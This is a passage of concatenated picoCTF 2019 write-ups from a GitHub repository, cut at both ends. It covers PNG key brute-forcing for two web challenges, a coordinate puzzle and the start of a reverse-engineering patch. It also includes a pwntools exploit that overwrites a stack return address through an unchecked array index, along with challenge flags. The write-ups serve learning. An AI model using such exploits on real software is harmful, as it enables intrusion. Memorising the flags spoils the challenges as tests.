71 13 0 183 112 6 0 78 68 32 78 138 41 76 175 239 114 0 10 107 243 179 0 0 13 25 144 54 75 141 137 226 2 135 0 74 146 212 120 0 0 49 119 154 121 231 191 113 63 61 73 207 252 109 29 156 237 237 205 44 181 255 234 45 201 81 7 111 130 76 72 160 71 252 189 222 4 45 102 16 164 153 122 6 236 97 221 248 223 189 159 191 15 186 67 214 172 254 6 103 1 239 222 111 241 128 173 157 249 176 240 95 173 172 207 128 248 254 100 121 231 32 123 102 156 187 25 219 126 99 10 127 136 254 208 144 42 223 245 199 191 126 63 242 65 146 62 217 103 195 245 123 51 216 107 122 239 128 4 205 81 87 164 77 166 255 1 56 191 144 200 56 6 36 54 208 38 51 163 146 136 97 152 102 86 67 136 54 254 211 246 158 221 31 179 191 243 21 0 230 168 247 251 222 113 110 91 32 183 22 244 45 1 220 168 97 180 247 205 207 14 199 186 146 106 250 144 115 222 151 173 111 131 220 144 233 122 255 219 176 73 150 157 22 143 74 217 68 101 232 176 170 113 254 92 169 250 106 153 148 251 31 124 122 156 191 239 186 121 94 197 5 252 248 34 55 29 252 124 181 226 55 127 124 206 48 75 126 234 94 137 135 121 191 89 24 135 209 221 81 56 181 115 52 122 68 77 240 90 247 182 197 190 111 203 15 236 79 123 223 170 144 93 244 56 247 7 190 219 76 219 245 39 129 110 133 226 176 46 193 253 78 206 160 247 86 91 37 36 24 234 87 241 98 57 36 107 14 56 242 135 213 233 55 229 121 228 96 149 95 6 92 30 230 184 44 149 107 102 16 42 182 95 228 158 18 21 32 205 77 53 94 221 173 252 21 127 15 82 95 163 242 120 224 214 163 0 230 91 72 244 111 255 32 95 225 170 135 57 178 172 87 45 193 84 78 90 202 51 178 127 63 249 165 189 47 239 27 208 191 248 67 223 59 130 249 207 207 49 252 164 114 231 181 214 188 181 227 26 125 27 198 147 64 200 215 229 143 249 29 171 227 252 115 152 80 6 143 53 160 77 210 113 143 214 204 219 20 236 102 252 153 126 12 3 249 152 188 213 49 94 226 157 55 144 180 159 251 199 200 141 203 31 146 9 206 111 7 85 183 119 73 111 109 171 243 240 189 215 29 215 242 235 162 178 174 106 73 165 173 84 219 232 242 250 59 147 235 27 119 211 11 99 98 142 102 37 139 64 58 30 49 178 226 245 73 253 239 252 179 115 177 18\r\n```\r\n\r\nIt then performs swaps based on the key entered by the user. If the key is correct, the swaps will turn this byte array into a valid PNG image.\r\n\r\nThe key is 16 characters long, and judging according to the `key.charCodeAt(i) - 48` snippet, valid characters are only digits (since this is a well-known method to turn a digit's ASCII value to the actual digit it represents).\r\n\r\nA [PNG file](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) starts with a magic signature of eight bytes (`89 50 4E 47 0D 0A 1A 0A`) followed by a series of chunks, where  each chunk header has a well-known structure: 4 bytes of length and 4 bytes of chunk type. The first chunk is called `IHDR` and has the length of 0XD, so we know that the next 8 bytes are `00 00 00 0D 49 48 44 52`.\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Java_Script_Kiddie# xxd -g 1 ../Flags/flag.png | head\r\n00000000: 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52  .PNG........IHDR\r\n00000010: 00 00 06 6a 00 00 04 47 08 02 00 00 00 7c 8b ab  ...j...G.....|..\r\n00000020: 78 00 00 00 01 73 52 47 42 00 ae ce 1c e9 00 00  x....sRGB.......\r\n00000030: 00 04 67 41 4d 41 00 00 b1 8f 0b fc 61 05 00 00  ..gAMA......a...\r\n00000040: 00 09 70 48 59 73 00 00 16 25 00 00 16 25 01 49  ..pHYs...%...%.I\r\n00000050: 52 24 f0 00 00 a8 8e 49 44 41 54 78 5e ec dd 2d  R$.....IDATx^..-\r\n00000060: 94 dc 46 da 30 ec 07 18 0e 34 0c 34 0c 0c da b3  ..F.0....4.4....\r\n00000070: 30 30 70 e1 c2 3d 8b 0c 0d 0d 0d 03 16 18 06 06  00p..=..........\r\n00000080: 06 e6 3c c8 e0 01 86 86 66 6b 18 68 e8 f3 a2 9c  ..<.....fk.h....\r\n00000090: f3 7d 25 d5 8f ee 2a a9 66 ba 67 ba c7 3f b9 ae  .}%...*.f.g..?..\r\n```\r\n\r\nSince we know how the first 16 bytes of a PNG file should look like, we can guess the key.\r\n\r\nFor each character of the key, we just need to try all digits until we find one that places the expected value in the current location. \r\n\r\nNote that depending on our input, we might end up with several keys that correctly recreate the first 16 bytes of the PNG file. We should ignore any solution which doesn't produce a valid PNG file though.\r\n\r\nHere's a script that does this:\r\n```python\r\nfrom PIL import Image\r\nimport itertools, io, os\r\nKEY_LEN = 16\r\n\r\ndef create_png(bytes_arr, key, out_dir_path):\r\n    if not os.path.isdir(out_dir_path):\r\n        raise Exception(\"Output folder ('{}') does not exist!\".format(out_dir_path))\r\n    result = [0] * len(bytes_arr)\r\n    for i in range(KEY_LEN):\r\n        shifter = int(key[i])\r\n        for j in range(len(bytes_arr) // KEY_LEN):\r\n            result[(j * KEY_LEN) + i] = bytes_arr[(((j + shifter) * KEY_LEN) % len(bytes_arr)) + i]\r\n    img_bytes = io.BytesIO(bytes(result))\r\n\r\n    try:\r\n        img = Image.open(img_bytes)\r\n        img.save(os.path.join(out_dir_path, \"{}.png\".format(key)))\r\n        print (\"Key {} produces a valid PNG - Saving\".format(key))\r\n    except IOError:\r\n        print (\"Key {} produces an invalid PNG - Ignoring\".format(key))\r\n\r\n\r\nshifters = []\r\nfor i in range(KEY_LEN):\r\n    shifters.append([])\r\nexpected = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]\r\nwith open(\"bytes.txt\") as f:\r\n    bytes_arr = list(map(int, f.read().split(\" \")))\r\n    for i in range(KEY_LEN):\r\n        for shifter in range(10):\r\n            j = 0\r\n            offset = (((j + shifter) * KEY_LEN) % len(bytes_arr)) + i\r\n            if bytes_arr[offset] == expected[i]:\r\n                shifters[i].append(shifter)               \r\n\r\nfor p in itertools.product(*shifters):\r\n    key = \"\".join(\"{}\".format(n) for n in p)\r\n    create_png(bytes_arr, key, \"out\")\r\n```\r\n\r\nRunning the script produces the following key:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Java_Script_Kiddie# python3 solve.py\r\n[[0], [4], [3], [8], [8], [9], [2], [2], [0], [8, 9], [9], [9], [1], [4], [6], [4]]\r\nKey 0438892208991464 produces a valid PNG - Saving\r\nKey 0438892209991464 produces an invalid PNG - Ignoring\r\n```\r\n\r\nUsing the valid key, we get the following image:\r\n\r\n![](images/qr.png)\r\n\r\nWhich translates to the flag:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Java_Script_Kiddie# zbarimg out/0438892208991464.png\r\nQR-Code:picoCTF{905765bf9ae368ad98261c10914d894e}\r\nscanned 1 barcode symbols from 1 images in 0.11 seconds\r\n```\r\n\r\n", "timestamp": "2025-10-21T13:36:27.522451"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Java_Script_Kiddie_2.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Java_Script_Kiddie_2.md", "content": "# Java Script Kiddie 2\r\nWeb Exploitation, 450 points\r\n\r\n## Description:\r\n> The image link appears broken... twice as badly...\r\n\r\n\r\n## Solution: \r\n\r\nThis is the follow-up for [Java Script Kiddie](Java_Script_Kiddie.md).\r\n\r\nThe website source:\r\n\r\n```html\r\n<html>\r\n\t<head>    \r\n\t\t<script src=\"jquery-3.3.1.min.js\"></script>\r\n\t\t<script>\r\n\t\t\tvar bytes = [];\r\n\t\t\t$.get(\"bytes\", function(resp) {\r\n\t\t\t\tbytes = Array.from(resp.split(\" \"), x => Number(x));\r\n\t\t\t});\r\n\r\n\t\t\tfunction assemble_png(u_in){\r\n\t\t\t\tvar LEN = 16;\r\n\t\t\t\tvar key = \"00000000000000000000000000000000\";\r\n\t\t\t\tvar shifter;\r\n\t\t\t\tif(u_in.length == key.length){\r\n\t\t\t\t\tkey = u_in;\r\n\t\t\t\t}\r\n\t\t\t\tvar result = [];\r\n\t\t\t\tfor(var i = 0; i < LEN; i++){\r\n\t\t\t\t\tshifter = Number(key.slice((i*2),(i*2)+1));\r\n\t\t\t\t\tfor(var j = 0; j < (bytes.length / LEN); j ++){\r\n\t\t\t\t\t\tresult[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\twhile(result[result.length-1] == 0){\r\n\t\t\t\t\tresult = result.slice(0,result.length-1);\r\n\t\t\t\t}\r\n\t\t\t\tdocument.getElementById(\"Area\").src = \"data:image/png;base64,\" + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t</script>\r\n\t</head>\r\n\t<body>\r\n\r\n\t\t<center>\r\n\t\t\t<form action=\"#\" onsubmit=\"assemble_png(document.getElementById('user_in').value)\">\r\n\t\t\t\t<input type=\"text\" id=\"user_in\">\r\n\t\t\t\t<input type=\"submit\" value=\"Submit\">\r\n\t\t\t</form>\r\n\t\t\t<img id=\"Area\" src=\"\"/>\r\n\t\t</center>\r\n\r\n\t</body>\r\n</html>\r\n```\r\n\r\nWe can see one main changes from last time: The key length is still 16 but the key itself has 32 characters. It looks like every second character is just a filler (`shifter = Number(key.slice((i*2),(i*2)+1))`) so this shouldn't matter much.\r\n\r\nOur bytes array this time is:\r\n```\r\n78 126 175 206 13 83 94 147 206 120 69 141 0 81 146 131 137 72 175 71 0 54 30 32 157 13 227 0 73 31 47 15 0 58 14 196 141 215 63 54 222 0 0 0 0 147 155 75 164 32 174 86 198 254 73 15 116 0 0 13 155 222 250 205 48 243 78 66 48 76 57 0 0 0 0 0 204 0 156 69 51 198 1 71 140 130 20 10 0 120 0 237 166 0 97 0 234 63 0 114 215 10 239 114 1 3 156 81 178 72 248 82 20 68 68 2 10 0 168 65 84 138 244 216 222 192 73 108 255 80 20 35 101 73 0 65 170 91 89 20 129 75 0 164 27 0 208 14 146 72 26 150 4 227 132 55 129 205 68 117 156 0 19 12 1 18 1 136 207 64 141 51 124 235 95 173 61 16 103 225 154 50 68 192 120 0 182 32 235 157 142 52 190 124 49 142 232 183 44 176 3 99 126 202 181 120 74 141 229 214 56 126 169 100 94 146 70 72 252 91 222 88 211 117 254 190 116 73 241 222 23 159 214 232 86 184 154 88 206 61 220 140 120 105 60 238 112 78 239 129 156 201 7 204 227 84 253 234 253 38 114 248 11 204 84 188 249 240 47 49 190 29 155 0 124 85 155 43 75 177 5 33 73 84 127 30 65 215 73 156 87 35 242 106 249 87 34 77 141 241 64 221 35 55 255 122 77 191 0 79 113 30 191 55 191 198 0 210 126 169 31 31 185 64 148 31 1 16 239 233 253 86 228 250 227 22 52 107 146 145 109 233 1 68 191 8 58 129 210 66 233 129 35 237 147 234 205 98 119 0 228 55 250 69 233 133 55 23 61 80 74 95 74 9 71 1 205 212 254 19 229 104 161 219 30 132 1 136 99 43 105 189 233 201 55 17 169 226 247 130 90 4 40 205 116 111 189 0 156 116 228 100 22 121 103 128 147 30 159 107 150 202 236 173 186 0 170 204 227 197 103 231 230 231 79 253 120 182 55 119 227 103 59 176 127 34 105 252 245 58 54 94 24 123 176 172 10 222 34 126 253 161 23 254 165 242 1 212 158 87 29 124 104 9 169 237 106 18 230 196 250 40 74 126 227 252 49 190 9 36 141 121 118 16 201 101 114 154 41 173 211 98 33 114 79 221 141 60 185 63 107 219 228 236 252 111 243 203 230 245 141 42 228 43 94 15 13 47 82 52 193 61 61 189 202 166 230 103 245 34 172 5 235 114 82 80 165 121 114 95 247 57 151 214 106 200 38 111 139 183 123 141 119 30 87 135 232 239 6 255 78 167 248 0 202 218 148 195 157 123 206 215 36 139 40 101 200 235 154 242 224 140 140 213 210 6 225 111 242 252 83 109 119 199 39 222 140 57 118 183 246 252 127 247 10 26 7 159 163 73 102 170 16 60 255 155 186 55 196 42 226 159 43 139 151 91 82 132 184 165 135 44 153 94 74 167 252 34 215 90 36 61 23 31 23 189 165 165 242 95 233 242 96 82 17 68 64 187 239 221 212 122 36 133 143 127 211 79 159 1 93 166 120 248 75 4 214 8 61 247 185 241 1 121 161 158 159 141 223 235 55 190 225 189 249 95 153 42 96 199 60 165 247 148 67 172 0 128 150 224\r\n```\r\n\r\nAfter applying minor modifications to the script from the previous challenge, we get:\r\n\r\n```python\r\nfrom PIL import Image\r\nimport itertools, io, os\r\nKEY_LEN = 16\r\n\r\ndef create_png(bytes_arr, key, out_dir_path):\r\n    if not os.path.isdir(out_dir_path):\r\n        raise Exception(\"Output folder ('{}') does not exist!\".format(out_dir_path))\r\n    result = [0] * len(bytes_arr)\r\n    for i in range(KEY_LEN):\r\n        shifter = int(key[i*2:i*2+1])\r\n        for j in range(len(bytes_arr) // KEY_LEN):\r\n            result[(j * KEY_LEN) + i] = bytes_arr[(((j + shifter) * KEY_LEN) % len(bytes_arr)) + i]\r\n    img_bytes = io.BytesIO(bytes(result))\r\n\r\n    try:\r\n        img = Image.open(img_bytes)\r\n        img.save(os.path.join(out_dir_path, \"{}.png\".format(key)))\r\n        print (\"Key {} produces a valid PNG - Saving\".format(key))\r\n    except IOError:\r\n        print (\"Key {} produces an invalid PNG - Ignoring\".format(key))\r\n\r\n\r\nshifters = []\r\nfor i in range(KEY_LEN):\r\n    shifters.append([])\r\nexpected = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52]\r\nwith open(\"bytes.txt\") as f:\r\n    bytes_arr = list(map(int, f.read().split(\" \")))\r\n    for i in range(KEY_LEN):\r\n        for shifter in range(10):\r\n            j = 0\r\n            offset = (((j + shifter) * KEY_LEN) % len(bytes_arr)) + i\r\n            if bytes_arr[offset] == expected[i]:\r\n                shifters[i].append(shifter)               \r\n\r\nprint (shifters)\r\n\r\nfor p in itertools.product(*shifters):\r\n    key = \"\".join(\"{}a\".format(n) for n in p)\r\n    create_png(bytes_arr, key, \"out\")\r\n```\r\n\r\nWe use '`a`' as the filler value for the key.\r\n\r\nRunning the script, we get:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Java_Script_Kiddie_2# python3 solve.py\r\n[[1], [8], [4], [1, 5], [0], [6], [9], [5], [4, 5], [2, 3, 4], [2, 3, 4, 5], [3], [1], [6], [9], [6]]\r\nKey 1a8a4a1a0a6a9a5a4a2a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a2a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a2a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a2a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a3a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a3a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a3a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a3a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a4a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a4a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a4a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a4a4a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a2a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a2a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a2a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a2a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a3a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a3a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a3a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a3a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a4a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a4a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a4a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a1a0a6a9a5a5a4a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a2a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a2a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a2a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a2a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a3a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a3a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a3a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a3a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a4a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a4a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a4a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a4a4a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a2a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a2a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a2a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a2a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a3a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a3a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a3a4a3a1a6a9a6a produces a valid PNG - Saving\r\nKey 1a8a4a5a0a6a9a5a5a3a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a4a2a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a4a3a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a4a4a3a1a6a9a6a produces an invalid PNG - Ignoring\r\nKey 1a8a4a5a0a6a9a5a5a4a5a3a1a6a9a6a produces an invalid PNG - Ignoring\r\n```\r\n\r\nThe key that produced a valid image is `1a8a4a5a0a6a9a5a5a3a4a3a1a6a9a6a`:\r\n\r\n![](images/qr2.png)\r\n\r\nWhich translated to:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Java_Script_Kiddie_2# zbarimg out/1a8a4a5a0a6a9a5a5a3a4a3a1a6a9a6a.png\r\nQR-Code:picoCTF{e1f443bfe40e958050e0d74aec4daa48}\r\nscanned 1 barcode symbols from 1 images in 0.05 seconds\r\n```", "timestamp": "2025-10-21T13:36:27.620849"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/L1im1tL355.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/L1im1tL355.md", "content": "# L1im1tL355\r\nBinary Exploitation, 400 points\r\n\r\n## Description:\r\n> Just pwn this program and get a flag.\r\n\r\n```c\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n\r\n#define FLAG_BUFFER 128\r\n\r\nvoid win() {\r\n  char buf[FLAG_BUFFER];\r\n  FILE *f = fopen(\"flag.txt\",\"r\");\r\n  fgets(buf,FLAG_BUFFER,f);\r\n  puts(buf);\r\n  fflush(stdout);\r\n}\r\n\r\nvoid replaceIntegerInArrayAtIndex(unsigned int *array, int index, int value) {\r\n   array[index] = value;\r\n}\r\n\r\nint main(int argc, char *argv[])\r\n{\r\n   int index;\r\n   int value;\r\n   int array[666];\r\n   puts(\"Input the integer value you want to put in the array\\n\");\r\n   scanf(\"%d\",&value);\r\n   fgetc(stdin);\r\n   puts(\"Input the index in which you want to put the value\\n\");\r\n   scanf(\"%d\",&index);\r\n   replaceIntegerInArrayAtIndex(array,index,value);\r\n   exit(0);\r\n}\r\n```\r\n\r\n## Solution:\r\n\r\nThis program declares an array on the stack, then allows us to write a DWORD to any array index. If we choose an index between 0 and 666/4, we'll end up writing to the array. However, the program does not check that we enter a legal index, and the index we request to write to can be larger than 666/4 or smaller than 0.\r\n\r\nSince the array is on the stack, the easiest way to exploit this is to provide a negative index and overwrite the function return address.\r\n\r\nIn our case, we need to provide a value of `-5` (found using trial and error). The program will execute `array[-5] = value` which is equivalent to `*(int*)(array + ( (-5)*sizeof(int) ) ) = value`. We'll provide the `value` of `win()`, which will print the flag.\r\n\r\n```python\r\n# First, generate a pwntools template using:\r\n# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7/vuln\r\n\r\n#===========================================================\r\n#                    EXPLOIT GOES HERE\r\n#===========================================================\r\n# Arch:     i386-32-little\r\n# RELRO:    Partial RELRO\r\n# Stack:    No canary found\r\n# NX:       NX enabled\r\n# PIE:      No PIE (0x8048000)\r\n\r\nimport os\r\n\r\nif shell is not None:\r\n    shell.set_working_directory(os.path.dirname(remote_path))\r\n\r\nio = start()\r\n\r\nio.sendlineafter(\"Input the integer value you want to put in the array\", str(exe.symbols[\"win\"]))\r\nio.sendlineafter(\"Input the index in which you want to put the value\", str(-5))\r\n\r\nprint io.recvall()\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/L1im1tL355# python exploit.py\r\n[*] '/media/sf_CTFs/pico/L1im1tL355/vuln'\r\n    Arch:     i386-32-little\r\n    RELRO:    Partial RELRO\r\n    Stack:    No canary found\r\n    NX:       NX enabled\r\n    PIE:      No PIE (0x8048000)\r\n[+] Connecting to 2019shell1.picoctf.com on port 22: Done\r\n[*] dvdalt@2019shell1.picoctf.com:\r\n    Distro    Ubuntu 18.04\r\n    OS:       linux\r\n    Arch:     amd64\r\n    Version:  4.15.0\r\n    ASLR:     Enabled\r\n[+] Opening new channel: 'pwd': Done\r\n[+] Receiving all data: Done (13B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/tmp/tmp.6XNY7d0Y0s'\r\n[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done\r\n[+] Receiving all data: Done (0B)\r\n[*] Closed SSH channel with 2019shell1.picoctf.com\r\n[*] Working directory: '/problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7'\r\n[+] Starting remote process '/problems/l1im1tl355_4_b2111fe5737c985221bac06a80d6d6c7/vuln' on 2019shell1.picoctf.com: pid 1343635\r\n[+] Receiving all data: Done (34B)\r\n[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 1343635)\r\n\r\n\r\npicoCTF{str1nG_CH3353_5243a217}\r\n```", "timestamp": "2025-10-21T13:36:27.717308"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Mr-Worldwide.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Mr-Worldwide.md", "content": "# Mr-Worldwide\r\nCryptography, 200 points\r\n\r\n## Description:\r\n> A musician left us a message. What's it mean?\r\n\r\n```\r\npicoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}\r\n```\r\n\r\n## Solution: \r\n\r\nThese look like coordinates. If take the first letter of the location matching each of the coordinates, we get:\r\n\r\n```\r\n[K]yoto             (35.028309, 135.753082)\r\n[O]dessa            (46.469391, 30.740883)\r\n[D]ayton            (39.758949, -84.191605)\r\n[I]stanbul          (41.015137, 28.979530)\r\n[A]bu Dhabi         (24.466667, 54.366669)\r\n[K]uala Lumpur      (3.140853, 101.693207)\r\n_\r\n[A]ddis Ababa       (9.005401, 38.763611)\r\n[L]oja              (-3.989038, -79.203560)\r\n[A]msterdam         (52.377956, 4.897070)\r\n[S]leepy Hollow     (41.085651, -73.858467)\r\n[K]odiak            (57.790001, -152.407227)\r\n[A]lexandria        (31.205753, 29.924526)\r\n---------------------------------------------\r\npicoCTF{KODIAK_ALASKA}\r\n```\r\n\r\nSometimes the location is a city, sometimes a region.\r\nDue to this reason, it's hard to solve the challenge programmatically. The closest I got is by using the `geocode` field of a geocoding service, via the following script:\r\n\r\n```python\r\nimport requests, re\r\n\r\nflag = \"picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}\"\r\n\r\ndef get_letter_from_coordinate(match):\r\n    lat = match.group(1)\r\n    long = match.group(2)\r\n    r = requests.get(\"https://geocode.xyz/{},{}?json=1\".format(lat, long))\r\n    j = r.json()\r\n    return j[\"geocode\"][0]\r\n\r\nprint re.sub(r'\\(([\\d\\.-]+), ([\\d\\.-]+)\\)', get_letter_from_coordinate, flag)\r\n```\r\n\r\nOutput:\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Mr-Worldwide# python solve.py\r\npicoCTF{KODIAK_ALANKA}\r\n```\r\nAlthough the output from the console is `picoCTF{KODIAK_ALANKA}`, the final answer is `picoCTF{KODIAK_ALASKA}` as mentioned above. Sleepy Hollow has a `geocode` of `NEWCITY-LCIXI` and an `altgeocode` of `SLEEPYUS-LCIXI`, however there was no clear rule when to prefer the `altgeocode` over the `geocode`, at least from a programmatic perspective.\r\n\r\nUsing other fields such as `city` or `region` provided worse results.\r\n", "timestamp": "2025-10-21T13:36:27.823367"}
{"source": "github", "repo": "Dvd848/CTFs", "file": "2019_picoCTF/Need_For_Speed.md", "url": "https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/Need_For_Speed.md", "content": "# Need For Speed\r\nReverse Engineering, 400 points\r\n\r\n## Description:\r\n> The name of the game is speed. Are you quick enough to solve this problem and keep it above 50 mph?\r\n\r\n\r\n## Solution: \r\n\r\nThis challenge is similar to last year's [be-quick-or-be-dead-1](/2018_picoCTF/be-quick-or-be-dead-1.md).\r\n\r\nWe run the program and hit an alarm:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Need_For_Speed# ./need-for-speed\r\nKeep this thing over 50 mph!\r\n============================\r\n\r\nCreating key...\r\nNot fast enough. BOOM!\r\n```\r\n\r\nLet's patch the program, just like last time:\r\n\r\n```console\r\nroot@kali:/media/sf_CTFs/pico/Need_For_Speed# cp need-for-speed patched\r\nroot@kali:/media/sf_CTFs/pico/Need_For_Speed# r2 patched\r\n -- Add custom Have you setup your ~/.radare2rc today?\r\n[0x000006b0]> aaa\r\n[Cannot analyze at 0x000006a0g with sym. and entry0 (aa)\r\n[x] Analyze all flags starting with sym. and entry0 (aa)\r\n[Cannot analyze at 0x000006a0ac)\r\n[x] Analyze function calls (aac)\r\n[x] Analyze len bytes of instructions for references (aar)\r\n[x] Check for objc references\r\n[x] Check for vtables\r\n[x] Type matching analysis for all functions (aaft)\r\n[x] Propagate noreturn information\r\n[x] Use -AA or aaaa to perform additional experimental analysis.\r\n[0x000006b0]> afl\r\n0x000006b0    1 42           entry0\r\n0x000006e0    4 50   -> 40   sym.deregister_tm_clones\r\n0x00000720    4 66   -> 57   sym.register_tm_clones\r\n0x00000770    5 58   -> 51   entry.fini0\r\n0x000007b0    1 10           entry.init0\r\n0x00000a30    1 2            sym.__libc_csu_fini\r\n0x000007ba    6 135          sym.decrypt_flag\r\n0x00000650    1 6            sym.imp.puts\r\n0x00000690    1 6            sym.imp.exit\r\n0x00000932    4 66           sym.header\r\n0x00000a34    1 9            sym._fini\r\n0x000008d7    1 47           sym.get_key\r\n0x00000841    3 29           sym.calculate_key\r\n0x000009c0    4 101          sym.__libc_csu_init\r\n0x00000974    1 62           main\r\n0x00000680    1 6            sym.imp.__sysv_signal\r\n0x00000660    1 6            sym.imp.printf\r\n0x00000670    1 6            sym.imp.alarm\r\n0x00000906    1 44           sym.print_flag\r\n0x00000610    3 23           sym._init\r\n0x00000640    1 6            sym.imp.putchar\r\n0x00000000    6 459  -> 485  loc.imp._ITM_deregisterTMCloneTable\r\n0x0000085e    1 33           sym.alarm_handler\r\n0x0000087f    3 88           